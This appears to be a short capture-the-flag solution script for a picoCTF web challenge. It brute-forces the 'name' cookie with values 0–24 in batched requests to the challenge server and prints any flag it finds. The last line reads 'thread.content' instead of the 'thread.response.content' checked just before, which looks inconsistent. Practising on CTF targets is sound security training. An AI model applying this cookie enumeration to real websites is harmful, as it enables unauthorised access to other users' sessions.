import enigma

threads = enigma.MultiRequestHandler(batch_size=10)

for i in range(25):
    threads += enigma.request("GET", "http://mercury.picoctf.net:29649", cookies={"name": f"{i}"})

threads.run()

for thread in threads:
    if thread.response and enigma.find_in_string(thread.response.content):
        print(enigma.find_in_string(thread.content)[0][1].decode('utf-8'))
